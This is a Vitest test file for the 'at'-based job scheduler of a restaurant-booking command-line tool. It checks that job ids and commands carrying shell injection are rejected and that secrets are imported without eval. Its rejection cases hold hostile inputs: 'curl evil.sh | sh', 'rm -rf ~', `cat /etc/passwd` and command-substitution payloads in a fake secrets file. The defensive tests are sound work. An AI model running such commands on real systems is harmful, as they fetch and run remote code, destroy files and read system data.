import { describe, it, expect, beforeEach, afterEach } from "vitest";
import { mkdtempSync, rmSync, writeFileSync, existsSync } from "node:fs";
import { execFileSync } from "node:child_process";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { createAtScheduler, localTimestamp } from "../../src/scheduler/at.js";

describe("scheduler/at", () => {
  let tmp: string;
  const origState = process.env.XDG_STATE_HOME;

  // We stub the POSIX `at` invocation so the tests don't write to the real
  // at-queue. The stub increments a counter and returns a deterministic
  // "at job id" for every enqueue.
  let nextAtJobId = 0;
  const enqueueStub = async () => String(++nextAtJobId);
  let cancelledAtJobs: string[] = [];
  const cancelAtStub = async (id: string) => {
    cancelledAtJobs.push(id);
  };

  beforeEach(() => {
    tmp = mkdtempSync(join(tmpdir(), "restaurant-cli-test-"));
    process.env.XDG_STATE_HOME = tmp;
    nextAtJobId = 0;
    cancelledAtJobs = [];
  });

  afterEach(() => {
    rmSync(tmp, { recursive: true, force: true });
    if (origState === undefined) delete process.env.XDG_STATE_HOME;
    else process.env.XDG_STATE_HOME = origState;
  });

  it("schedules and lists jobs via metadata store (and records atJobId)", async () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    await sched.schedule({
      id: "job-1",
      command:
        "restaurant book --venue 1 --party 2 --date 2026-05-01 --time 19:00",
      runAt: new Date("2026-04-30T14:00:00Z"),
      providerId: "resy",
    });
    const listed = await sched.list();
    expect(listed).toHaveLength(1);
    expect(listed[0]!.id).toBe("job-1");
    // The scheduler should have enriched the persisted row with the at-job id
    // so `restaurant jobs cancel` can call `atrm` without asking `atq`.
    expect(listed[0]!.metadata?.atJobId).toBe("1");
  });

  it("rejects duplicate job ids", async () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    const job = {
      id: "dup",
      command: "noop",
      runAt: new Date(),
      providerId: "resy",
    };
    await sched.schedule(job);
    await expect(sched.schedule(job)).rejects.toThrow(/already scheduled/);
  });

  it("cancel() removes persisted job AND calls atrm with the at-job id", async () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    await sched.schedule({
      id: "to-cancel",
      command: "noop",
      runAt: new Date(),
      providerId: "resy",
    });
    expect(await sched.cancel("to-cancel")).toBe(true);
    expect(await sched.list()).toHaveLength(0);
    expect(cancelledAtJobs).toEqual(["1"]);
    expect(await sched.cancel("to-cancel")).toBe(false);
  });

  it("cancel() survives an atrm failure so the local row never leaks", async () => {
    const flaky = async () => {
      throw new Error("Cannot find job 99");
    };
    const sched = createAtScheduler({ enqueue: enqueueStub, cancelAt: flaky });
    await sched.schedule({
      id: "orphan",
      command: "noop",
      runAt: new Date(),
      providerId: "resy",
    });
    expect(await sched.cancel("orphan")).toBe(true);
    expect(await sched.list()).toHaveLength(0);
  });

  it("rejects shell-unsafe job ids (defense in depth)", async () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    // The wrapper script in buildWrapperScript interpolates job.id into a
    // bash `echo "..."` line. A `"` or `$` in the id would break out; the
    // guard must fire BEFORE enqueue so no at-job gets created with a
    // dangerous id.
    for (const bad of [
      'job"with"quotes',
      "job$HOME",
      "job`cat /etc/passwd`",
      "job\nnewline",
      "job;rm -rf",
    ]) {
      await expect(
        sched.schedule({
          id: bad,
          command: "noop",
          runAt: new Date("2027-01-01T00:00:00Z"),
          providerId: "resy",
        }),
      ).rejects.toThrow(/Unsafe job id/);
    }
    // Canonical format (what snipe.ts produces) must pass.
    await expect(
      sched.schedule({
        id: "snipe-2027-01-01T00-00-00-000Z-abcd1234",
        command: "noop",
        runAt: new Date("2027-01-01T00:00:00Z"),
        providerId: "resy",
      }),
    ).resolves.toBeUndefined();
  });

  it("rejects commands with unquoted shell metacharacters but allows quoted args", async () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    for (const bad of [
      "restaurant book; rm -rf ~",
      "restaurant book && curl evil.sh | sh",
      "restaurant book $(cat /etc/passwd)",
      "restaurant book `whoami`",
      "restaurant book > /tmp/out",
      "restaurant book\nrm -rf ~",
    ]) {
      await expect(
        sched.schedule({
          id: "snipe-2027-01-01T00-00-00-000Z-abcd1234",
          command: bad,
          runAt: new Date("2027-01-01T00:00:00Z"),
          providerId: "resy",
        }),
      ).rejects.toThrow(
        /unquoted shell metacharacter|multi-line|unterminated single quote/,
      );
    }
    // The canonical snipe shape — every value single-quoted — must pass even
    // when a value contains a metacharacter inside the quotes.
    await expect(
      sched.schedule({
        id: "snipe-2027-01-01T00-00-00-000Z-feedface",
        command:
          "restaurant book --venue '1387' --notes 'table by the window; quiet'",
        runAt: new Date("2027-01-01T00:00:00Z"),
        providerId: "resy",
      }),
    ).resolves.toBeUndefined();
  });

  it("imports secrets without eval/source and filters to an allowlist", () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    const script = sched.buildWrapperScript({
      id: "snipe-2027-01-01T00-00-00-000Z-abcd1234",
      command: "restaurant book --venue 1 --party 2",
      runAt: new Date("2027-01-01T00:00:00Z"),
      providerId: "resy",
    });
    // A compromised secrets file must never reach `eval` or `source`: those
    // would execute `$(...)`/backtick payloads embedded in a token value.
    expect(script).not.toMatch(/\beval\b/);
    expect(script).not.toMatch(/\bsource\b/);
    expect(script).not.toMatch(/^\s*\.\s+["$]/m);
    // The safe importer reads each line literally and assigns verbatim.
    expect(script).toContain("while IFS= read -r line");
    expect(script).toContain('export "$key=$val"');
    // Only provider tokens are allowlisted; unrelated secrets stay isolated.
    expect(script).toContain("RESY_AUTH_TOKEN");
    expect(script).not.toContain("GITHUB_TOKEN");
  });

  it("secret import executes no command substitution from a hostile token", () => {
    const sched = createAtScheduler({
      enqueue: enqueueStub,
      cancelAt: cancelAtStub,
    });
    const script = sched.buildWrapperScript({
      id: "snipe-2027-01-01T00-00-00-000Z-deadbeef",
      command: ":",
      runAt: new Date("2027-01-01T00:00:00Z"),
      providerId: "resy",
    });
    const proof = join(tmp, "PWNED_PROOF");
    const secretsFile = join(tmp, "hostile.secrets.env");
    writeFileSync(
      secretsFile,
      [
        `export RESY_AUTH_TOKEN='$(touch ${proof})'`,
        "export RESY_API_KEY=`touch " + proof + "`",
        "export GITHUB_TOKEN='leaked'",
        "",
      ].join("\n"),
    );
    // Drive only the importer, then echo the imported value, against the
    // hostile file. If the old `eval` path were present, the payload would
    // run and create the proof file.
    const harness = [
      script.slice(0, script.indexOf("\n{")), // function definition only
      `__rcli_import_keys "${secretsFile}"`,
      'printf "%s" "$RESY_AUTH_TOKEN"',
      "",
    ].join("\n");
    const out = execFileSync("bash", ["-c", harness], { encoding: "utf8" });
    expect(existsSync(proof)).toBe(false); // no command substitution ran
    expect(out).toBe("$(touch " + proof + ")"); // stored as a literal string
  });

  it("localTimestamp formats as YYYYMMDDHHMM in local time", () => {
    // Constructed from wall-clock parts so the test is tz-stable:
    // new Date(2026, 3, 30, 14, 5) == Apr 30 2026 14:05 in whichever tz
    // the test runner is in. localTimestamp must reflect those same parts.
    const d = new Date(2026, 3, 30, 14, 5);
    expect(localTimestamp(d)).toBe("202604301405");
  });
});
